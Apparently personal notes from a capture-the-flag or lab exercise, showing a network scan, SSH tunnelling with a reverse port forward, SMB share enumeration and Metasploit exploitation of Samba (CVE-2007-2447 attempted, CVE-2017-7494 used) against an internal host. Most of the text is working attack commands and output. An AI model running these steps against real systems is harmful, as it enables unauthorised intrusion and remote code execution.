# Mike notes

```bash
./neuromancer_easy "$(python3 cfp.py)"
```
- created ssh connection
- from 10.128.161.46
- there is nmap
```bash
nmap -sV -p 0-65535 10.128.162.0/24 > other-network-scan.txt
```

```text
Starting Nmap 7.93 ( https://nmap.org ) at 2026-10-14 18:35 UTC
Nmap scan report for 10.128.162.1
Host is up (0.0000040s latency).
All 1000 scanned ports on 10.128.162.1 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: 4E:73:F0:AF:95:25 (Unknown)

Nmap scan report for 10.128.162.9
Host is up (0.0000060s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 02:42:0A:80:A2:09 (Unknown)
Service Info: Host: CLOUD-HOPPER

Nmap scan report for 10.128.162.10
Host is up (0.0000060s latency).
All 1000 scanned ports on 10.128.162.10 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: 02:42:0A:80:A2:0A (Unknown)

Nmap scan report for buckeye (10.128.162.11)
Host is up (0.0000040s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
8888/tcp open  sun-answerbook?
```

```bash
ssh -N \
    -R 4444:127.0.0.1:4444 \
    -L 139:10.128.162.9:139 \
    -L 445:10.128.162.9:445 \
    -i /home/apultyn/.ssh/id_ed25519 \
    -p 52961 \
    root@10.128.161.46 
```

```bash
ssh -i id_ed25519 root@10.128.161.46 -p 52961
```

- tried to use CVE‑2007‑2447, wasted loads of time figuring the tunelling
- use exploit/multi/samba/usermap_script
- then tried to check the version and it turns out it was wrong version

```bash
nmap -Pn -p 139,445 -sV --script smb-os-discovery 127.0.0.1
```

```text
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.4-Ubuntu (workgroup: WORKGROUP)
```

- there is another vulnerability: CVE-2017-7494
- enumerated the shares on target:
```bash
smbclient -L //127.0.0.1 -U '%'
```

```text
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tony            Disk      
        IPC$            IPC       IPC Service (cloud-hopper server (Samba, Ubuntu))
```

- tested if tony accessible:

```bash
smbclient //127.0.0.1/tony -U '%' 
```
- got access to filesystem, tested if writeable:

```bash
put /etc/hostname test.txt
```

- it is. Now I have to guess the server-side absolute path of the share. Now I can exploit:

```bash
use exploit/linux/samba/is_known_pipename
set RHOSTS 127.0.0.1
set SMB_SHARE_NAME tony
set SMB_FOLDER /home/tony
exploit
```

- volia